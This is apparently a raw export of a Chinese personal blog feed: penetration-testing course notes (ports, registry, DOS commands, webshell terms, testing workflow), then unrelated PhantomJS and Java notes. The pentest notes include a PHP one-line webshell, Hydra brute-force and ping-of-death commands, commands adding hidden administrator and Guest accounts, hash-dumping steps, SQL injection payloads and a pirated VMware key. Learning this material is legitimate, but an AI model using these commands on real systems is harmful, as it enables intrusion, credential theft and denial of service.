Telnet(远程登录)协议代理服务器常用端口:23 TFTP,默认端口69/udp; SSH,SCP,端口重定向,默认为22/TCP; SMTP,25/TCP; POP3:110/TCP; TOMCAT:8080; WIN2003远程登录:3389; QQ:1080/UDP; &lt;-- 资料: win2003经典套装-戴有炜 端口服务对照表 黑客命令行攻防实战详解.至诚文化.扫... --&gt; 黑客通过端口进行: 信息搜集; 目标探测; 服务判断; 系统判断; 系统角色分析; 注册表:(Registry)(windows称之为登录档) 是windows中的一个重要的数据库,用于存储系统和应用程序的设置信息. 存放各种参数,直接控制着windows的启动,硬件驱动程序的装载以及一些windows应用程序的运行. 比如注册表中保存有应用程序和资源管理器外壳的初始条件,首选项和卸载数据等.联网计算机的 整个系统的设置和各种许可,文件扩展名与应用程序的关联,硬件部件的描述,状态和属性.性能记录 和其他底层的系统状态信息,以及其他数据等. cmd-&gt;regedit (安装后门-&gt;通过注册表)(可以改桌面,基本什么都可以) 1.HKEY_CLASSES_ROOT 管理文件系统.根据在Windows中按照的应用程序的扩展名,该根键指明其文件类型的名称,相应打开 该文件所要调用的程序等等信息. 2.HKEY_CURRENT_USER 管理系统当前的用户信息.在这个根键中保存了本地计算机中存放的当前登录的用户信息,包括用户登录用户名和暂存的密码.在 用户登录windwos98时,其信息从HKEY_USERS中相应拷贝到HKEY_CURRENT_USER中. 3.HKEY_LOCAL_MACHINE(提权中经常用) 管理当前系统硬件配置.在这个根键中保存了本地计算机硬件配置数据,此根键下的子关键字包括 在SYSTEM.DAT中,用来提供HKEY_LOCAL_MACHINE所需的信息,或者在远程计算机中可访问的一组键中. 这个根键里面的许多子键与System.ini文件中设置项类似. 4.HKEY_USERS 管理系统的用户信息.在这个根键中保存了存放在本地计算机口令列表中的用户标识和密码列表. 同时每个用户的预配置信息都存储在HKEY_USERS根键中.HKEY_USERS是远程计算机中访问的根键之一. 5.HKEY_CURRENT_CONFIG 管理当前用户的系统配置.在这个根键中保存着定义当前用户桌面配置(如显示器等等)的数据,该用户 使用过得文档列表(MRU),应用程序配置和其他有关当前用户的windwos98中文版的安装的信息. 不少计算机系统感染了网络病毒后,可能会在这些注册表中做修改: HKEY_CURRENT_USER\Software\Microsoft\Windows\Current Version\RunOnce HKEY_CURRENT_USER\Software\Microsoft\Windows\Current Version\Run HKEY_CURRENT_USER\Software\Microsoft\Windows\Current Version\RunServices (1)IE起始页的修改 HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main 的右半部分窗口中的Start Page就是IE主页地址了. (2)Internet选项按钮灰化&amp;失效 HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Control Panel 下的DWORD值&quot;Setting&quot;=dword:1 &quot;Links&quot;=dword:1 &quot;SecAddSites&quot; dword:1全部改为0之后 再将 HKEY_USERS\DEFAULT\Software\Policies\Microsoft\Internet Explorer\Control Panel下 的DWORD值&quot;homepage&quot;键值改为0,则无法使用&quot;Internet选项&quot;修改IE设置 (3)&quot;源文件&quot;项不可用 HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Restrictions 的&quot;NoViewSource&quot;被设置为1了,改为0就可以恢复正常. (4)&quot;运行&quot;按钮被取消&amp;失效 HKEY_CURRENT_USER\Software\Microsoft\Windows\Current Version\Policies\Explorer 的&quot;NoRun&quot;键值被改为1了,改为0就可以恢复. (5)&quot;关机&quot;按钮被取消&amp;失效 HKEY_CURRENT_USER\Software\Microsoft\Windows\Current Version\Policies\Explorer 的&quot;NoClose&quot;键值被改为1了,改为0就可以恢复 (6)&quot;注销&quot;按钮被取消&amp;失效 HKEY_CURRENT_USER\Software\Microsoft\Windows\Current Version\Policies\Explorer 的&quot;NoLogOff&quot;键值被改为1了,改为0就可恢复 (7)磁盘驱动器被隐藏 HKEY_CURRENT_USER\Software\Microsoft\Windows\Current Version\Policies\Explorer 的&quot;NoDrives&quot;键值被改为1了,改为0就可恢复. 入侵中常用的注册表: HKEY_LOCAL_MACHINE\software\hzhost\config\settings\mysqlpass HKEY_LOCAL_MACHINE\software\hzhost\config\settings\mssqlpss HKEY_LOCAL_MACHINE\software\hzhost\config\settings\mastersvrpass HKEY_LOCAL_MACHINE\SYSTEM\LIWEIWENSOFT\INSTALLFREEADMIN\11 HKEY_LOCAL_MACHINE\SYSTEM\LIWEIWENSOFT\INSTALLFreeHost\11 &lt;-- www.cracer.com/?post=374 --&gt; DOS: ping -t -l 65500 ip死亡之ping(发送大于64K的文件并一直ping就成了死亡之ping) TTL=53 低于68的是linux,win7,08,NT6.0的内核 每经过一个路由器,就会-1 TTL=128 XP,03 systeminfo: 复制补丁,和提权补丁对比. arp -a 查看所有局域网里的计算机 xxx.xx.xx.网关ip ren 原文件名 新文件名 重命名文件名 net share ipc$ 开启ipc$共享 net share ipc$ /del 删除ipc$共享 net share c$ /del 删除C:共享 内网渗透测试: Hydra破解密码]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>渗透</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试学习笔记03-06(1)-网站搭建与http头]]></title>
    <url>%2F2018%2F09%2F10%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B003-06-1-%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA%E4%B8%8Ehttp%E5%A4%B4%2F</url>
    <content type="text"><![CDATA[网站篇 http头讲解: HTTP/1.1 HTTP版本号 200 响应码 动态网站: 指网站内容可根据不同情况动态变更的网站,一般情况下动态往后在哪通过数据库进行架构. 百度-&gt;inur:asp?id= 网址/robots.txt 是否是伪静态,自己改网址. .html-&gt; .php?id=xxx 测试是否有注入 and 1=1 --%20 ,即查到黑客入侵 网站搭建: 1.windows+iis+asp+access 2.windows+iis+asp+mssql 3.windows+asp小旋风+asp+access 1.windows+apmserv+php+mysql 2.windows+tomcat+jsp+mysql 3.linux+apche+php+mysql]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>渗透</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试学习笔记02-windows讲解]]></title>
    <url>%2F2018%2F09%2F10%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002-windows%E8%AE%B2%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[`系统目录,服务,端口,注册表 系统目录: windows program files 用户 perflogs -&gt; perfLogs是windows7的日志信息 ProgramData-&gt;(一般木马喜欢感染这些)(存放应用程序的临时配置文件,会随着应用启动生成一些配置文件) 杀软一般不杀ProgramData这个目录. 64位指cpu (x86)指如果默认是32位就默认安装在x86下面 Temp:临时文件 Windows-&gt;System32-&gt;config-&gt;SAM 用PE不进系统,去开SAM-&gt;lc5破解/彩虹表 有权限的话对SAM进行读取哈希值,然后就可以破解 pe可以改SAM明文,但是不能读 (权限提升-&gt;getpass)(可以读明文,可以读哈希) cmd-&gt;net user administrator 123.com 抓哈希: cmd-&gt;PwDump7.exe(pw7)-&gt;密文:500是UID号,windows是500,linux是0第一行第二段是密文 明文:(能读出来就是要管理权限) Windows-&gt;System32-&gt;drivers-&gt;etc-&gt;hosts DNS服务器: 数据包-&gt;指定DNS服务器-&gt;DNS服务器查询域名对应的IP-&gt;百度 (hosts优先级要高于DNS服务器)(reg:ping www.baidu.com) (hosts-&gt;最后写上1.1.1.1 www.baidu.com 进行测试) -&gt;附:DNS: DNS(Domain Name Server,域名服务器)是进行域名(domain name)和与之相对应的IP地址(IP address)转换的服务器. DNS是计算机域名系统 (Domain Name System 或Domain Name Service) 的缩写，它是由域名解析器和域名服务器组成的。域名服务器是指保存有 该网络中所有主机的域名和对应IP地址，并具有将域名转换为IP地址功能的服务器。 DNS服务器在域名解析过程中的查询顺序为：本地缓存记录、区域记录、转发域名服务器、根域名服务器。 用户-&gt;用户名-&gt; (对内网进行渗透的话要用这个)(不用登陆该电脑账号来通过权限查询桌面信息) 服务: 定义计算机开了哪些功能, services.msc metasploit,msf-&gt;kali安装后门 pentestbox-&gt;将kali工具封装打包放在win下 常见的服务: web服务,dns服务,dhcp服务,邮件服务,telent服务,ssh服务,ftp服务,smb服务 web服务:搭建网站的 dhcp服务:给客户机分发可用ip telnet服务:远程连接. cmd-&gt;netstat -an 端口是23. (远程端口) win7打开windos功能安装telnet客户端. 远程登录过去之后,ipconfig就显示的是远程端的IP 爆破密码:(网速,性能,成功率很少)(一般对该人进行信息搜集来增加几率) CPU集成电路板,集成很多CPU,来进行爆破 GPU显卡爆破 密码攻击-&gt;hydra-8.1-win 字典文件-&gt;pass.txt(演示用自己生成) 太长的话就改文件夹名-&gt;hy cmd-&gt;hydra.exe -l administrator -P pass.txt 192.168.3.100 telnet 服务端口:(1-65535) 1-1024:预保留端口,已经占用了,一般设置8000之后的 80:www(web) 21:ftp 25:smtp 20:也算ftp 53:dns 67,68:dhcp 69:tftp 43:https 45:smb(共享服务) 3306:mysql 1433:sqlserver 1521:oracle 23:telnet 22:ssh 25:smtp 110:pop3 -------------- :vnc 8021:filze 43958:serveru 3389:rdp(远程桌面) 黑客通过端口可以: 信息搜集,目标探测,服务判断,系统判断,系统角色分析 系统判断-&gt;linux 22. telnet被窃取的话会被发现,ssh是有加密的 nmap-O 192.168.3.100(端口扫描之王)-&gt;探测版本 系统角色分析:80,21-&gt;做网站的虚拟子机(阿里云就是这么干的,比较安全) ping www.cracer.com (阿里云,创宇安全性好一点) 注册表: 5个跟键-&gt;子键 是windows操作系统的核心数据库. 默认浏览器有时候也要修改注册表 木马3个部分看: 1.regedit 2.msconfig-&gt;启动 C:-&gt;programData-&gt;Microsoft-&gt;Windows-&gt;开始菜单-&gt;程序-&gt;启动 删除/记事本清空它 3.通过网络来查 cmd netstat -n (检测到的,一般是动态域名,或者用的其他的电脑ip) `DOS命令 一般在提权的时候用 color /? ping -t -| ipconfig /release释放IP /renew重新获取IP /all systeminfo --获取系统详细信息(最主要是判断有没有安装补丁)(漏洞没有打补丁的话就可以直接提权) arp -a --获取当前局域网中有哪些主机的ip的 只能判断最近一次缓存表里存在的主机,每5分钟返回一次 net view --获取局域网有哪些主机名 shutdown -s -t 180 -c &quot;hello&quot; shutdown -a msg --系统命令弹框 mas hackerhost &quot;hello hackerxxx&quot; dir --dir c: cd start --start www.baidu.com --路径&gt;start pass.txt --路径&gt;notepad pass.txt copy --copy pass.txt C:\ del --del c:\pass.txt md --创建目录 md xiaomulu rd --删除目录 rd xiaomulu /* 创建 copy con 123.txt 创建123.txt hello cracer xxxx xxxxx 最后按 ctrl+z回车 保存. */ type 123.txt --在命令行中打开 cat 123.txt --linux里面的命令 move 123.txt hy --移动 后面跟的移到哪 tree --查看文件 net use K: \\192.168.3.100\c$ 回车 --盘符映射 administrator 123456 就会在本地创建一个K盘 (开防火墙,就会拦截) ncpa.cpl --本地连接 net use K: /del --删除映射 net start telnet --开启telnet服务(必须不是禁用的) net stop telnet --关闭 net user --查看user net user xiao 123 /add --添加xiao用户 net localgroup administrators xiao /add --提升权限 net localgroups --查看本地有哪些组 Remote Desktop Users --远程桌面用户组 如果有安装了安全狗,能创建用户但是不能加到管理员组,但是可以加入到远程桌面组,这里还是普通用户 然后,将文件都降权处理.(有杀狗神器) net localgroup &quot;remote desktop users&quot; xiao /add net user Guest net user guest /active:yes --启用 net user guest 123456 net localgroup administrators guest /add net user xiao 123 /ad --也可以创建用户,现在也绕不过360了 netstat --查看端口 tasklist --查看进程 taskkill /im cmd.exe --结束进程 netsh --网络管理的接口 netsh wlan set hostednetwork mode=allow ssid=cc key=123456 netsh wlan start hosted --加载wlan at --设置计划任务/查看计划 at 22:51 shutdown -s -t 1800 attrib 批处理:bat(很多dos命令放在一个里面) copy con x.bat net user cr 123.com /add net localgroup administrators cr /add shutdown -s -t -c &quot;hello hacked by cr .you are hacking...&quot; ctrl+z 回车 任务: 1.熟记服务对应端口 2.常用dos命令]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>渗透</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试学习笔记01-基础讲解]]></title>
    <url>%2F2018%2F09%2F10%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001-%E5%9F%BA%E7%A1%80%E8%AE%B2%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[`测试会用到虚拟机,一般加个内存条就行 `会考试,笔试+机试 被抓的话挂VPN也没用 常用的术语: 1.脚本(asp,php,jsp) --右击看不到源代码 2.html(css,js,html) 3.HTTP协议 --https(加密) --http抓包能抓到账号密码 4.CMS(B/S)(sei mou si) DZ,南方,帝国,思途,dedecms --企业网站用(),医院(织梦:做SU好优化,好推广),学校(织梦),博客(wordpress) --论坛(DZ(discuz)) 5.MD5 --加密算法(不可逆)(哈希值16,32位...)(注入) --20位(去掉前3位,后去1位)(织梦) 6.肉鸡,抓鸡,跳板 --肉鸡:被控的电脑,被黑客入侵并被长期驻扎的计算机或服务器 --抓鸡:控制别人电脑的过程,利用使用量大的程序的漏洞,使用自动化方式获取肉鸡的行为 --跳板:在入侵的时候找一台肉鸡来当跳板,通过肉鸡来入侵 (挂VPN的话,人家就会记录你VPN的IP) (直接入侵,记录的是IP,通过挂个VPN来连接另外一台电脑,通过另外一台电脑来入侵,该电脑就是跳板,记录的是中间的这台电脑IP) 7.一句话,小马,大马 webshell,提权,后门,跳板 Webshell:通过web入侵的一种脚本工具,可以据此对网站服务进行一定程度的控制 --一句话:一句话(木马,比如:asp写&lt;% eval()%&gt;||&lt;?php @eval($_POST[&apos;XXX&apos;]);?&gt;) (预处理前期变量来接收信息.)(参数:也就是密码,菜刀手连接的密码) --小马:之前是用海洋顶端,小马的功能:用来上传大马.两个框,一个保存文件的地址,一个是保存文件的内容.(小马拉大马) &lt;form method=post action=&quot;&quot;//木马地址&gt; &lt;textarea name=cracer&gt; //这里写php代码 phpinfo(); &lt;/textarea&gt; &lt;input type=submit /&gt; &lt;/form&gt; --大马:控制网站不满足,就需要webshell提权到管理员对整个服务器控制.就需要上传大马. --webshell:网站后门,一句话,小马,大马都称webshell. --提权:提升服务器权限.操作系统低权限的账户将自己提升为管理员权限使用的方法 --后门:留后门方便下次进入.有很多种后门.黑客为了对主机进行长期的控制,在机器上种植的一段 程序或留下的一个&quot;入口&quot; --旁站入侵: 即同服务器下的网站入侵,入侵之后可以通过提权跨目录等手段拿到目标 网站的权限.常见的旁站查询工具有:webRobot,御剑,明小子和web在线查询等. --C段入侵: 即同C段下服务器入侵.如目标ip为192.168.1.253入侵192.168.1.*的任意一台机器, 然后利用这些黑客工具嗅探获取在网络上传输的各种信息,常用的工具有:在windows 下有cain,在unix下有snifft,snoop,tcpdump,dsniff等. 8.源码打包,脱裤 --源码打包:下载源码 --脱裤:拖数据库信息(主要拖用户数据) 9.嗅探,rookit --抓包嗅探,网络数据包. --rookit:系统机隐藏后门 (抓3个鸡就要判3-5年)(鸡可以买,看服务器网络接口定位价钱) (海洋cms6.28 做视频的) -&gt;任务: 1.下载各种CMS(php,asp)10-15个,搭建起来 渗透测试流程:(特点:思路+经验) 黑盒测试: 在未授权的情况下,模拟黑客的攻击方法和思维方式,来评估计算机网络系统可能存在的安全风险. 黑盒测试不同于黑客入侵,并不等于黑站.黑盒测试考验的是综合的能力(OS,Datebase,Script,code,思路,社工) -&gt;(给公司写一份报告写出来就ok了) 白盒测试:相对黑盒测试,白盒测试基本是从内部发起. 另一种说法:知道源代码和不知道源代码的渗透测试.白盒偏代码审计. APT攻击: Advanced Persistent Threat,高级可持续性攻击,是指组织或者小团体利用先进的攻击手段对特定目标进行 长期持续性网络攻击的攻击形式. (1).极强的隐蔽性. (2).潜伏期长,持续性强 (3).目标性强 1.明确目标: 确定范围 确定规则 确定需求 2.信息收集: 基础信息 系统信息 应用信息 版本信息 服务信息 人员信息 防护信息 3.漏洞探测 系统漏洞 webServer漏洞 web应用漏洞 其他端口服务漏洞 通信安全 4.漏洞验证 自动化验证 手工验证 试验验证 登陆猜解 业务漏洞验证 公开资源的利用 5.信息分析 精准打击 绕过防御机制 定制攻击路径 绕过检测机制 攻击代码 6.获取所需 实施攻击 获取内部信息 进一步渗透 持续性存在* 清理痕迹 7.信息整理 整理渗透工具 整理收集信息 整理漏洞信息 8.形成报告 按需整理 补充介绍 修补建议 经验分享: 信息搜集 注意搜集0day 流程: 委托受理极端: 受理客户申请-&gt;签署保密协议-&gt;签订合同 评测准备阶段: 编制测评方案-&gt;方案沟通确认 评测实施阶段: 工具扫描-&gt;人工审计 综合评估阶段: 编制测评报告-&gt;报告审批-&gt;报告发送 结题阶段: 报告归档-&gt;报告总结-&gt;客户满意度调查 (VM一般用国外的) (公司教的是业务流程,不是技术流程) (两个标准)(OWASP top 10) 信息收集(占60%-80%) (所有人,cms,后台url,dns,whois查询,端口,,邮箱旁站,C段) (whios-&gt;可以查到注册邮箱,姓名,地址,电话...) (WAF,,工具网站,整站,子域,C段,目录扫描) 漏洞探测 (sql注入,xss,文件上传,下载漏洞,文件包含,变量覆盖,代码执行) 漏洞验证 (poc,尽量不要写exp)(poc漏洞验证,exp漏洞利用) (reg:id=27 and select version(),证明这个漏洞存在) (exp:reg:id=27 union select 1,2,admin,pass from admin)(直接暴露用户名和密码) 学习环境配置: 百度:vmware(官网) -&gt;下载-&gt;点右边第二个-&gt;Desktop-&gt;VMware W P 下载产品 百度:vmware 注册码 1F04Z-6D111-7Z029-AV0Q4-3AEH8 (如果有中断报错,去博客http://www.cracer.com/?post=328)(一个批处理,先运行批处理就能解决了) (要求安装个人系统,win xp,win 7服务器系统,win 03,linux) (linux-&gt;版本:Debian 6) 虚拟机应用配置: (VMware WORKSTATION 12 PRO) (网络,扩容,IIS,系统映射文件) (XP,win7,2003,2008,2012,linux) 网络连通: (网络适配器NAT),虚拟机虚拟出来的网卡 (自定义,桥接,NAT模式) (上网用NAT模式)(cmd-&gt;ncpa.cpl) (属性-&gt;自动获取IP)(指派-&gt;在VM的编辑-&gt;虚拟网络里面查找) (子网IP)(DHCP) (service-&gt;VM-DHCP/NAT-&gt;都要启动)(services.msc) (cmd-&gt;ping-&gt;TTL=128,xp,08一般返回128)(中间经过几个路由器TTL就减多少) (自定义-&gt;VMnet)(编辑-&gt;虚拟网络)(不能上网,仅本机测试) (桥接,发布虚拟机的网站)(虚拟机和物理机在同一个网络.) (物理机物理网络-&gt;ping-&gt;IPv4) (路由器-&gt;端口映射-&gt;搭站)(找了一个access源码-&gt;复制到VM-&gt;192.168.0.104:99) (192.168.0.1-&gt;高级用户-&gt;虚拟服务器-&gt;填一个) (当别人看我IP时,我要映射到VM的IP) (本机IP:99-&gt;可以访问VM的网址) (一定要在路由器上进行,没有路由器就直接访问,二级路由器可以试试ping,能ping通就能找到) (配置虚拟机之后,要点一个快照.之后玩坏就点快照一键恢复) 测试系统的安装: HTTP协议讲解: 403:(页面存在,但是不能访问目录下的内容) http:url(http://host[&quot;:&quot;port][abs_path]) (linux对大小写敏感) (伪静态:其实是动态.reg:xxx.html) (测试:xxx.asp,xxx.jsp,xxx.php aspcms2.0) http头讲解: 200 响应码(代表页面存在) date content-type 类型 cookie -&gt; reg: 浏览器-&gt;工具-&gt;代理-&gt;bp-&gt;抓包 打开安全工具包-&gt;漏洞分析-&gt;burpsuite proxy-&gt;intercept-&gt;intercept is on (x-forwarded-for:)(ip-client)(referer) http请求方法: get,post,options,put,move,delete,trace dz论坛,通过http头突破 访问后台管理系统: Referer:http://xx.xx.x.x:xx/admin/ (写入到数据库中) x-forwarded-for:a.b.c.d&apos; client-ip:a.b.c.d&apos; refere:&apos; 安全狗(走tcp三次握手来获取网站的,而不是http头的)(ack,seq) https协议: http+ssl/tls 网站搭建配置: VM (工具搭) asp-&gt;(小旋风?直接启动) php-&gt;代码审计-&gt;phpStudy2014(可以切换各种版本的php和apache) (IIS搭) VM-&gt;开始-&gt;管理您的服务器-&gt;添加或删除角色-&gt;自定义配置-&gt; IIS-&gt;两个都勾. 安装完成之后-&gt;开始-&gt;管理工具-&gt;IIS-&gt;网站-&gt;默认-&gt;换成源码站 权限-&gt;添加一个everyone asp的话-&gt;web服务扩展-&gt;Active Server Pages启用 网站-&gt;右键-&gt;文档-&gt;全删除-&gt;添加index.asp 主目录-&gt;配置-&gt;选项-&gt;调试-&gt;复选勾选上 php-&gt;zKeysPHP.exe(配搭的是mySQL) IIS-&gt;网站-&gt;新建-&gt;ip,端口(换一个)-&gt;要勾选一个运行脚本(php) 属性-&gt;文档-&gt;index.php-&gt;配置-&gt;映射查看有没有.php php-&gt;添加源码网站-&gt;权限问题就设置源码文件的权限. 新建数据库-&gt;U/P:root/zkeys 属性-&gt;IP-&gt;可以绑定一个 多个IP设置:不自动获取,手写. php属性-&gt;IP-&gt;高级网站标识-&gt;添加]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>渗透</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[本地phantomjs学习列表]]></title>
    <url>%2F2018%2F09%2F10%2F%E6%9C%AC%E5%9C%B0phantomjs%E5%AD%A6%E4%B9%A0%E5%88%97%E8%A1%A8%2F</url>
    <content type="text"><![CDATA[==================================== &quot;use strict&quot;; //引用后js编写进入严格模式 phantomjs test1.js //直接执行js文件 , 并将网页以图片返回 arguments.js //加载参数并循环输出 time_plan.js //定时器 module.js , universe.js //module加载universe里面的answer方法，（模块化） loadspeed.js //简单的加载参数例子 netlog.js //简单的request，response监控 title_test.js //简单的evaluate与onConsoleMessage效果演示 useragent.js //简单的查看useragent，并更改useragent，及其调用js语法 loadjquery.js //简单加载jquery文件用以使用jquery语法 echoToFile.js //简单写入文件 fibo.js //简单的斐波队列 printenv.js //打印环境变量 outputEncoding.js //改变encoding编码打印字 scandir.js.//js列出文件路径名称及子文件路径名称 sleepsort.js //根据它们的值排序整数和延迟显示 version.js //输出phantomjs版本号 color wheel.js //打造一个全色的圆 rasterize.js //将网页栅格化为图像或者pdf render_multi_url.js //将多个网页呈现为图像 injectme.js //将自身js注入网页上下文中 *page_events.js //js黑注入的测试代码 *unrandomize.js //人工修改Math.random函数，并在页面初始化时加载，伪造函数 detectedniff.js //检测网页是否嗅探用户代理 post.js //向测试服务器发送HTTP POST请求 postserver.js //启动一个web服务器并向它发送一个HTTP POST请求 server.js //启动一个web服务器并向它发送一个HTTP GET请求 serverkeepalive.js //启动一个以纯文本回答的web服务器 simpleserver.js //启动一个以HTML格式回答的web服务器 features.js //检测使用的浏览器功能modernizr.js useragent.js //更改浏览器的用户代理属性 run-jasmine.js //运行基于jasmine的测试 run-qunit.js //运行基于Qunit的测试 ====================================]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>前端</category>
        <category>Node</category>
        <category>phantomjs</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>phantomjs</tag>
        <tag>NodeJs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaSE学习笔记01-注解与反射]]></title>
    <url>%2F2018%2F09%2F10%2FJavaSE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001-%E6%B3%A8%E8%A7%A3%E4%B8%8E%E5%8F%8D%E5%B0%84%2F</url>
    <content type="text"><![CDATA[一、java se之注解与反射 1、注解的由来 将不包含业务逻辑的部分，也称作服务或能力， 直接通过标注(注解，Annatation)来定义与识别，不再通过xml等配置。 减少配置量,项目一大配置太多，反而成为负担 2、关于配置与注解 1.1 注解的优势：配置的烦锁与注解的灵活 1.2 注解的劣势：太灵活导致维护性差 1.3 实战项目选择：配置+注解 3、关于反射 3.1 “正射”：通过正常的import等引用，直接new出来的对象。 3.2 “反射”：通过Class字节码对象来实例化其对应的实例。 3.3 强大的反射无处不在，hadoop,nutch,spark等通过配置即可看出大部分应用到反射。 3.4 正向代理与反向代理 正向与反向，你可以认为从客户端角度来说的。 客户端能知道代理的存在，则为正向。那么爬虫代理显然是正向代理 客户端不知道代理的存在，则为反向。apache httpd,nginx均常做反向代理，多用于负载均衡等场景。 4、常用注解 Override：用于检查方法是否被真正准确的重写 Deprecated: 用于标志属性、方法等已经过时，不再建议被使用 SuppressWarnings : 阻止某些情况下的warnning信息 5、元注解：注解的注解 Retention：保持力，保留范围 source: 注解信息只在源文件中 class:在字节码文件中，但不被jvm加载与识别 runtime:在字节码中，被jvm加载，主要用于反射 Target 注解的修饰类型，包括包、类、方法、属性、局部变量等,通过ElementType枚举类来搞定。 Documented 该注解是否也加入到java doc Inherited 该注解能否被继承 5、注解的用法与autowired的简单实现 6、总结 循序渐进，锲而不舍。 细致耐心，高手可成。]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>Java</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>笔记</tag>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaSE学习笔记01--网络编程]]></title>
    <url>%2F2018%2F09%2F10%2FJavaSE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[网络编程(network programming) 1、何为网络遍程 1.1 网络编程是网站、网页编程的底层基础,但与他们不相等、不同。 网络编程，对于高级开发语言面言，多是指基于socket的编程， 也就是面向tcp/udp的编程。 而网页编程，多是面向http协议编程。它是以网络编程为底层基础的。 通过网络编程的参考模型可知。 1.2 网络互联参考模型 1.2.1 学术界的参考模型OSI:open system interconnection 7层：从底向上为： 物理层：封装的底层电气、机械特性，即0、1传输，以bit为单位 数据链路层：是对0、1等最基本单位的封装，成为各种传输单元。 网络层：将下层封装起来的数据单元从src终端传到dst终端。这里只是说计算机之间的到达，即端到端的传输。 传输层：上边是端到端，即机器到机器。该处即为机器内的进程到机器内的进程的传输。 即是tcp/udp编程的所在层。 会话层：维持网络联接的开始、中断、重启。 表示层：为应用层提供加解密、解码等操作。 应用层：如http、ftp、smtp等协议集中在此。像大数数的应用编程多集于此层开发。 工业界的实际参考模型Tcp/IP：tcp and ip protocol group 4层：从底向上： osi的第1、2层合成该层: 网络层： 传输层： osi的第5、6、7层合成该层： 1.2.2 启示 分层的设计架构：到目前也是无处不在，是最主流的解决复杂网络、软件设计等问题的方案，即分层的设计思路。 包括nutch、hadoop、lucene、spark等等均是在不断的分层过程中逐渐发展壮大的。 以及现在java web设计之最流行的MVC，model-view-control，即是经典的分层。 启示结果：解析复杂问题的最有效方法，即是分层架构设计。 1.3 tcp、udp优缺点 tcp:面向链接、可靠的数据传输， 主要在于三次握手，最后有4次握手释放链接。 效率相对低。 应用场景：讲究可靠、有序性，像打电话、QQ聊天、浏览器浏览网页等。 相对来说tcp的应用范围更广。 udp:面向无链接，不可靠的数据传输。 效率相对高。 应用场景：对可靠性要求不高的情况，像语音聊天、游戏场景(war3)等等。 2、难点 2.1 多线程编程 多线程的同步处理 2.2 高效率 并发一高，会导致通讯变慢等情况。 解决这一问题，可以通过java nio编程，即非阻塞方式，即通道channel和选择器selector来搞定。 3、重点 3.1 网络io流的熟练掌握 网络编程，关键就是数据流的传输，故io流要熟练。 3.2 java socket编程api熟练掌握 网络编程的核心包即java.net包，重要api均在此。 4、实战项目 4.1 类QQ群的网络聊天室 4.1.1 面向对象分析： (1)socket server (2)socket client,分两个client。 第1个client,是用户端的client。 第2个client,是服务器的client，是服务器端为了接收与响应客户端的client来初始化工作。 (3)守护线程 daemone thread (4)系统启动器，即controler部分 (5)业务管理器，即manager部分 (6)数据解析类，即发送或接收到的数据的解析 4.2 功能模块划分 (1) 用户端之客户端 * 通过读取console端输入的数据，写给服务器端socket server。 * 读取socket server发过来的消息，构成实际的网络聊天室。 ps: 以上两点要并行执行，即要产生两个线程 (2) 服务器端，做接受和分发客户端 * 通过socket server的accept方法，接受user client，并初始化一个 server端的client与之对应。完成双方的socket读写。 * 读取服务器的console输入,即服务器端要给客户端的消息，并通过守护线程实际写给各user client (3) 服务器端之客户端 * 读取user client的信息，给服务器的消息管理器。最后由守护线程来完成真正的分发。 * 读取服务器端要写给user client的消息，最终通过持有的user client socket的写入流将数据 写给user client端。 统一用语： 用户端的客户端：user client 服务器的客户端：server client 服务器本身： socket server 4.3 类QQ的聊天器。 经过聊天室的程序改造，即可完成该任务。 些任务留做各位同学的课后作业吧，有兴趣的一定要亲自去改改。]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>Java</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>笔记</tag>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaSE学习笔记02--网络编程]]></title>
    <url>%2F2018%2F09%2F10%2FJavaSE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%2F</url>
